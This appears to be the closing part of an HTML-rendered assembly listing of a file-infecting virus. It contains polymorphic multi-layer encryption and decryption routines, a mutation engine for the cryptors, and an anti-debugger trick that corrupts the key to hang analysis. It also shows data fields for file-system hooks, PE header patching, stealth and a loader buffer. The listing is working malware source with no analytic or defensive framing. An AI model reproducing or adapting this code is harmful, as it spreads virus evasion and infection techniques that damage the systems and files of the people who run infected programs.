        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">enc_table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">GenerateAlgo</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRandomEAX</span><span class="sc0">
</span><span class="sc5">tbl_loop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">cr_table_nr</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">cr_table_nr</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">tbl_loop</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dec_table</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dec_algo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">enc_table</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">enc_algo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">;/* A simple addon for mutating all encryptions and decryptions some */</span><span class="sc0">

</span><span class="sc5">MutateCryptors</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateAlgo</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">enc_algo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">simple_enc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dec_algo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">simple_dec</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateAlgo</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">enc_algo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">main_enc</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">dec_algo</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">main_dec</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenerateAlgo</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">











    </span><span class="sc1">;/* 32-bit main encryption, 16 to 255 layers */</span><span class="sc0">

</span><span class="sc5">poly_encrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PolyLoops</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">encloop2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">encryptedsize</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">encrypt_dword</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">main_enc</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_dword</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encloop2</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;_________________________________</span><span class="sc0">

</span><span class="sc5">ProcessKey</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PolyLoops</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">rorloop</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; ror shift key 16 to 255 times to match our encryption</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">rorloop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MutatedKey</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">encryptedsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">encrypted</span><span class="sc0">       </span><span class="sc1">; end of encrypted body (polymorphic)</span><span class="sc0">

</span><span class="sc1">;_________________________________ </span><span class="sc0">


    </span><span class="sc1">;/* 32-bit main decryptor */</span><span class="sc0">

</span><span class="sc5">CryptKey</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">poly_decrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; gets the ESP when SEH was set</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">                       </span><span class="sc1">; restore registers </span><span class="sc0">


        </span><span class="sc6">pushad</span><span class="sc0">
</span><span class="sc5">getkey</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; EBX holds decryptor key</span><span class="sc0">
</span><span class="sc5">MutatedKey</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">dcloop1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; corrupt decryptor key, we're being debugged... results in that the decryptor</span><span class="sc0">
</span><span class="sc5">dcloop1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pushad</span><span class="sc0">              </span><span class="sc1">; loop will turn into an infinite loop and hang execution ;)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">encryptedsize</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">encryptedsize</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">decrypt_dword</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">main_dec</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt_dword</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/* Mutate key backwards (compared to the encryption algo.) */</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; rol shift key one step back towards the original first-layer key..</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CryptKey</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; does our result match the original key?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">dcloop1</span><span class="sc0">         </span><span class="sc1">; continue decrypting if not (16 to 255 loops)</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc5">end_decrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">install</span><span class="sc0">



</span><span class="sc5">lsize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">vstart</span><span class="sc0">



</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">;*                          *</span><span class="sc0">
</span><span class="sc1">;* Data buffering memory                *</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">

</span><span class="sc5">data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CryptMirror</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;ZeroBuffer db  2000h dup (0)</span><span class="sc0">
</span><span class="sc5">FileBuffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2000h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">PE_RVA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PE_SIZE</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LoaderOffs</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fsd_read</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fsd_write</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fsd_seek</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fsd_filetime</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">our_ioreq</span><span class="sc0">   </span><span class="sc5">ioreq</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">seek_ioreq</span><span class="sc0">  </span><span class="sc5">ioreq</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">Alignement</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">StealthData</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">EntryPointRVA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ImageSize</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CodeSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CheckSum</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ddFileTime</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">PolyLoops</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">st_data</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">st_pos</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">LoaderBuffer</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc5">patchsize</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">end_data</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
